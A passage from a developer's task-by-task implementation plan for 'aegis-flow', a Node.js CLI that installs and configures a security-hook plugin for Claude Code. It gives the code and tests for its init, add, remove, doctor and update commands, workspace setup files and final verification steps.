    console.log('Edit .claude/aegis-flow.json manually after init to correct detection.');
  }

  // Step 2: Security level
  const security = await select({
    message: 'Security level?',
    choices: Object.entries(SECURITY_LEVELS).map(([key, val]) => ({
      name: val.label,
      value: key,
      description: val.description
    })),
    default: 'strict'
  });

  // Step 3: Modules
  const enabledModules = await checkbox({
    message: 'Enable modules?',
    choices: Object.entries(MODULES).map(([key, val]) => ({
      name: `${key} — ${val.description}`,
      value: key
    }))
  });

  // Step 4: Write config
  console.log('\nWriting configuration...');
  const config = buildConfig({ project, security, modules: enabledModules });
  writeConfig(projectDir, config);
  console.log('  ✓ .claude/aegis-flow.json');

  // Step 5: Write hooks to settings.json
  const claudeDir = join(projectDir, '.claude');
  mkdirSync(claudeDir, { recursive: true });
  const settingsPath = join(claudeDir, 'settings.json');

  let settings = {};
  try {
    settings = JSON.parse(readFileSync(settingsPath, 'utf-8'));
  } catch {}

  settings.hooks = generateHooksConfig(security, pluginDir);
  writeFileSync(settingsPath, JSON.stringify(settings, null, 2) + '\n');
  console.log(`  ✓ .claude/settings.json (${SECURITY_LEVELS[security].hooks.length} hooks active)`);

  // Step 6: Generate filtered plugin.json
  const manifest = generateManifest(pluginDir, enabledModules);
  writeFileSync(
    join(pluginDir, '.claude-plugin', 'plugin.json'),
    JSON.stringify(manifest, null, 2) + '\n'
  );
  console.log('  ✓ plugin.json updated');

  // Step 7: Install plugin
  installPlugin(projectDir, pluginDir);
  console.log('  ✓ Plugin installed');

  console.log(`\nDone! Run \`claude\` to start with your secured workflow.`);
  console.log('Docs: https://aegis-flow.com/docs\n');
}
```

- [ ] **Step 3: Write bin/aegis-flow.js**

Create `cli/bin/aegis-flow.js`:

```javascript
#!/usr/bin/env node
import { Command } from 'commander';
import { runInit } from '../src/commands/init.js';
import { dirname, resolve } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const PLUGIN_DIR = resolve(__dirname, '..', '..');

const program = new Command();

program
  .name('aegis-flow')
  .description('Professional AI workflow — secure, tested, production-ready')
  .version('1.0.0');

program
  .command('init')
  .description('Initialize aegis-flow in the current project')
  .action(async () => {
    const projectDir = process.cwd();
    await runInit(projectDir, PLUGIN_DIR);
  });

// Placeholder commands — implemented in later tasks
program.command('add <module>').description('Enable a module');
program.command('remove <module>').description('Disable a module');
program.command('doctor').description('Verify setup health');
program.command('update').description('Update config after upgrade');

program.parse();
```

- [ ] **Step 4: Run test**

```bash
cd cli && npx vitest run tests/init.test.js && cd ..
```

Expected: PASS.

- [ ] **Step 5: Make bin executable and test CLI**

```bash
chmod +x cli/bin/aegis-flow.js
node cli/bin/aegis-flow.js --version
```

Expected: `1.0.0`

- [ ] **Step 6: Commit**

```bash
git add cli/bin/ cli/src/commands/init.js cli/tests/init.test.js
git commit -m "feat(cli): add init command

Interactive project setup: detect project, choose security level,
enable modules, write config and hooks, install plugin."
```

---

### Task 11: CLI — add, remove, doctor, update commands

**Files:**
- Create: `cli/src/commands/add.js`
- Create: `cli/src/commands/remove.js`
- Create: `cli/src/commands/doctor.js`
- Create: `cli/src/commands/update.js`
- Create: `cli/tests/add-remove.test.js`

- [ ] **Step 1: Write tests for add/remove**

Create `cli/tests/add-remove.test.js`:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { runAdd } from '../src/commands/add.js';
import { runRemove } from '../src/commands/remove.js';
import { existsSync, readFileSync, writeFileSync, mkdirSync } from 'fs';

vi.mock('fs');

const mockConfig = {
  version: '1.0.0',
  security: 'strict',
  modules: ['ticket-pilot'],
  project: { language: 'typescript' }
};

describe('runAdd', () => {
  beforeEach(() => {
    vi.resetAllMocks();
    existsSync.mockReturnValue(true);
    readFileSync.mockReturnValue(JSON.stringify(mockConfig));
    writeFileSync.mockReturnValue(undefined);
  });

  it('adds a module to config', async () => {
    await runAdd('/app', '/plugin', 'crypto-forge');
    const writeCall = writeFileSync.mock.calls.find(c => c[0].endsWith('aegis-flow.json'));
    const updated = JSON.parse(writeCall[1]);
    expect(updated.modules).toContain('crypto-forge');
    expect(updated.modules).toContain('ticket-pilot');
  });

  it('rejects unknown module', async () => {
    await expect(runAdd('/app', '/plugin', 'unknown')).rejects.toThrow('Unknown module');
  });
});

describe('runRemove', () => {
  beforeEach(() => {
    vi.resetAllMocks();
    existsSync.mockReturnValue(true);
    readFileSync.mockReturnValue(JSON.stringify(mockConfig));
    writeFileSync.mockReturnValue(undefined);
  });

  it('removes a module from config', async () => {
    await runRemove('/app', '/plugin', 'ticket-pilot');
    const writeCall = writeFileSync.mock.calls.find(c => c[0].endsWith('aegis-flow.json'));
    const updated = JSON.parse(writeCall[1]);
    expect(updated.modules).not.toContain('ticket-pilot');
  });
});
```

- [ ] **Step 2: Write add.js**

Create `cli/src/commands/add.js`:

```javascript
import { readConfig, writeConfig } from '../lib/config.js';
import { generateManifest } from '../lib/manifest.js';
import { MODULES } from '../constants.js';
import { writeFileSync } from 'fs';
import { join } from 'path';

export async function runAdd(projectDir, pluginDir, moduleName) {
  if (!MODULES[moduleName]) {
    throw new Error(`Unknown module: ${moduleName}. Available: ${Object.keys(MODULES).join(', ')}`);
  }

  const config = readConfig(projectDir);

  if (config.modules.includes(moduleName)) {
    console.log(`Module '${moduleName}' is already enabled.`);
    return;
  }

  config.modules.push(moduleName);
  writeConfig(projectDir, config);

  // Regenerate plugin.json with new module
  const manifest = generateManifest(pluginDir, config.modules);
  writeFileSync(
    join(pluginDir, '.claude-plugin', 'plugin.json'),
    JSON.stringify(manifest, null, 2) + '\n'
  );

  console.log(`✓ Module '${moduleName}' enabled.`);
  console.log(`  Restart Claude Code to load the new skills and agents.`);
}
```

- [ ] **Step 3: Write remove.js**

Create `cli/src/commands/remove.js`:

```javascript
import { readConfig, writeConfig } from '../lib/config.js';
import { generateManifest } from '../lib/manifest.js';
import { writeFileSync } from 'fs';
import { join } from 'path';

export async function runRemove(projectDir, pluginDir, moduleName) {
  const config = readConfig(projectDir);

  if (!config.modules.includes(moduleName)) {
    console.log(`Module '${moduleName}' is not enabled.`);
    return;
  }

  config.modules = config.modules.filter(m => m !== moduleName);
  writeConfig(projectDir, config);

  // Regenerate plugin.json without removed module
  const manifest = generateManifest(pluginDir, config.modules);
  writeFileSync(
    join(pluginDir, '.claude-plugin', 'plugin.json'),
    JSON.stringify(manifest, null, 2) + '\n'
  );

  console.log(`✓ Module '${moduleName}' disabled.`);
  console.log(`  Restart Claude Code to apply changes.`);
}
```

- [ ] **Step 4: Run tests**

```bash
cd cli && npx vitest run tests/add-remove.test.js && cd ..
```

Expected: all tests PASS.

- [ ] **Step 5: Write doctor.js**

Create `cli/src/commands/doctor.js`:

```javascript
import { existsSync, readFileSync } from 'fs';
import { join } from 'path';
import { validateConfig } from '../lib/config.js';
import { SECURITY_LEVELS, MODULES } from '../constants.js';

export async function runDoctor(projectDir, pluginDir) {
  console.log('\n🛡️  aegis-flow doctor\n');
  let healthy = true;

  // Check config
  const configPath = join(projectDir, '.claude', 'aegis-flow.json');
  if (existsSync(configPath)) {
    try {
      const config = JSON.parse(readFileSync(configPath, 'utf-8'));
      const validation = validateConfig(config);
      if (validation.valid) {
        console.log(`✓ Config:     .claude/aegis-flow.json valid (${config.security} mode)`);
      } else {
        console.log(`✗ Config:     invalid — ${validation.errors.join(', ')}`);
        healthy = false;
      }
    } catch (e) {
      console.log(`✗ Config:     .claude/aegis-flow.json parse error`);
      healthy = false;
    }
  } else {
    console.log('✗ Config:     .claude/aegis-flow.json not found');
    healthy = false;
  }

  // Check settings.json hooks
  const settingsPath = join(projectDir, '.claude', 'settings.json');
  if (existsSync(settingsPath)) {
    try {
      const settings = JSON.parse(readFileSync(settingsPath, 'utf-8'));
      const hookCount = Object.values(settings.hooks || {}).flat().reduce((sum, g) => sum + g.hooks.length, 0);
      console.log(`✓ Hooks:      ${hookCount} hooks active`);
    } catch {
      console.log('✗ Hooks:      settings.json parse error');
      healthy = false;
    }
  } else {
    console.log('✗ Hooks:      .claude/settings.json not found');
    healthy = false;
  }

  // Check hook scripts exist
  const hooksDir = join(pluginDir, 'core', 'hooks');
  const missingScripts = [];
  const expectedScripts = ['block-secrets.sh', 'protect-lockfiles.sh', 'auto-format.sh'];
  for (const script of expectedScripts) {
    if (!existsSync(join(hooksDir, script))) missingScripts.push(script);
  }
  if (missingScripts.length === 0) {
    console.log('✓ Scripts:    all hook scripts present');
  } else {
    console.log(`✗ Scripts:    missing ${missingScripts.join(', ')}`);
    healthy = false;
  }

  // Check modules
  try {
    const config = JSON.parse(readFileSync(configPath, 'utf-8'));
    const missingModules = config.modules.filter(m =>
      !existsSync(join(pluginDir, 'modules', m))
    );
    if (missingModules.length === 0) {
      console.log(`✓ Modules:    ${config.modules.length > 0 ? config.modules.join(', ') : 'none'} enabled`);
    } else {
      console.log(`✗ Modules:    missing directories for ${missingModules.join(', ')}`);
      healthy = false;
    }
  } catch {}

  console.log(`\nStatus: ${healthy ? 'healthy ✓' : 'issues found ✗'}\n`);
  return healthy;
}
```

- [ ] **Step 6: Write update.js**

Create `cli/src/commands/update.js`:

```javascript
import { readConfig, writeConfig } from '../lib/config.js';
import { generateHooksConfig } from '../lib/hooks.js';
import { writeFileSync, readFileSync } from 'fs';
import { join } from 'path';

export async function runUpdate(projectDir, pluginDir) {
  console.log('\n🛡️  aegis-flow update\n');

  const config = readConfig(projectDir);

  // Regenerate hooks
  const settingsPath = join(projectDir, '.claude', 'settings.json');
  let settings = {};
  try { settings = JSON.parse(readFileSync(settingsPath, 'utf-8')); } catch {}

  settings.hooks = generateHooksConfig(config.security, pluginDir);
  writeFileSync(settingsPath, JSON.stringify(settings, null, 2) + '\n');
  console.log('✓ Hooks regenerated');

  console.log('✓ Config is up to date\n');
}
```

- [ ] **Step 7: Wire all commands into bin/aegis-flow.js**

Update `cli/bin/aegis-flow.js` to import and wire add, remove, doctor, update commands:

Replace the placeholder commands with:

```javascript
import { runAdd } from '../src/commands/add.js';
import { runRemove } from '../src/commands/remove.js';
import { runDoctor } from '../src/commands/doctor.js';
import { runUpdate } from '../src/commands/update.js';

// ... after init command ...

program
  .command('add <module>')
  .description('Enable a module')
  .action(async (module) => {
    await runAdd(process.cwd(), PLUGIN_DIR, module);
  });

program
  .command('remove <module>')
  .description('Disable a module')
  .action(async (module) => {
    await runRemove(process.cwd(), PLUGIN_DIR, module);
  });

program
  .command('doctor')
  .description('Verify setup health')
  .action(async () => {
    await runDoctor(process.cwd(), PLUGIN_DIR);
  });

program
  .command('update')
  .description('Update config after upgrade')
  .action(async () => {
    await runUpdate(process.cwd(), PLUGIN_DIR);
  });
```

- [ ] **Step 8: Run all CLI tests**

```bash
cd cli && npx vitest run && cd ..
```

Expected: all tests PASS.

- [ ] **Step 9: Commit**

```bash
git add cli/
git commit -m "feat(cli): add add, remove, doctor, update commands

add: enable a module in aegis-flow.json
remove: disable a module
doctor: verify setup health (config, hooks, scripts, modules)
update: regenerate hooks after plugin upgrade"
```

---

### Task 12: Root package.json and .gitignore

**Files:**
- Create: `package.json` (workspace root)
- Modify: `.gitignore`

- [ ] **Step 1: Create root package.json**

Create `package.json`:

```json
{
  "name": "aegis-flow-workspace",
  "private": true,
  "workspaces": ["cli"]
}
```

- [ ] **Step 2: Update .gitignore**

Ensure `.gitignore` contains:

```
node_modules/
.DS_Store
.claude/aegis-flow-audit.log
*.log
```

- [ ] **Step 3: Create CLAUDE.md**

Create `CLAUDE.md`:

```markdown
# aegis-flow

Professional AI workflow — secure, tested, production-ready.

## Structure

- `core/` — hooks (shell), agents (markdown), skills (markdown). Always active.
- `modules/` — domain-specific plugins (crypto-forge, saas-forge, ticket-pilot). Activated via CLI.
- `cli/` — Node.js CLI for project setup. The only JavaScript in this repo.
- `tests/hooks/` — Shell-based hook tests. Run with `bash tests/hooks/run-all.sh`.

## Development

- CLI tests: `cd cli && npm test`
- Hook tests: `bash tests/hooks/run-all.sh`
- Agents and skills are pure Markdown — no tests needed, review content carefully.

## Conventions

- Hooks read JSON from stdin via `jq`, exit 0 (allow) or exit 2 (block with reason on stderr).
- Agents declare their tools in frontmatter. Read-only agents must NOT have Write/Edit/Bash.
- Skills define the user-facing command and dispatch to agents.
```

- [ ] **Step 4: Commit**

```bash
git add package.json .gitignore CLAUDE.md
git commit -m "chore: add root package.json, .gitignore, and CLAUDE.md

Workspace root points to cli/. CLAUDE.md documents conventions."
```

---

### Task 13: Final verification

Run all tests and verify the complete structure.

- [ ] **Step 1: Run hook tests**

```bash
bash tests/hooks/run-all.sh
```

Expected: all hook test suites PASS.

- [ ] **Step 2: Run CLI tests**

```bash
cd cli && npm test && cd ..
```

Expected: all CLI tests PASS.

- [ ] **Step 3: Verify directory structure**

```bash
find . -not -path './node_modules/*' -not -path './.git/*' -not -path './cli/node_modules/*' -type f | sort
```

Verify the output matches the file structure defined at the top of this plan.

- [ ] **Step 4: Verify CLI works**

```bash
node cli/bin/aegis-flow.js --help
node cli/bin/aegis-flow.js --version
```

Expected: help text with all 5 commands, version `1.0.0`.

- [ ] **Step 5: Verify hooks are executable**

```bash
ls -la core/hooks/*.sh
```

Expected: all `.sh` files have execute permission.

- [ ] **Step 6: Verify plugin.json is valid JSON**

```bash
jq . .claude-plugin/plugin.json
```

Expected: valid JSON output with all agents listed.

- [ ] **Step 7: Final commit (if any fixes needed)**

```bash
git status
# If clean: nothing to do
# If changes: stage, commit with "fix: address verification issues"
```

- [ ] **Step 8: Tag the release**

```bash
git tag v1.0.0
```
